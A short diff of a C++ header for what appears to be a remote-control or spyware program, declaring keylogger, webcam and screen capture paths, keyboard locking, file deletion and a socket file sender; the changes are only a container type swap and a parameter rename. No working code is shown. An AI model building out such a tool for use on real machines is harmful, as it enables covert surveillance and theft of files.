@@ -27,7 +27,7 @@ using namespace cv;
 
 extern stringstream inp, out;
 extern string webcamCapturePath, keyloggerCapturePath, screenCapturePath, requestFilePath;
-extern map<string, map<string, function<void()>>> handlers;
+extern unordered_map<string, unordered_map<string, function<void()>>> handlers;
 
 string getFileName(const string& filePath);
 void getInstruction();
@@ -49,7 +49,7 @@ void captureScreen();
 void lockKeyboard();
 void unlockKeyboard();
 void deleteFile(LPCWSTR filePath);
-void copyFile(LPCWSTR src, LPCWSTR dest);
+void copyFile(LPCWSTR src, LPCWSTR dst);
 void sendFile(CSocket& socket, const string& filePath);
 
 #endif
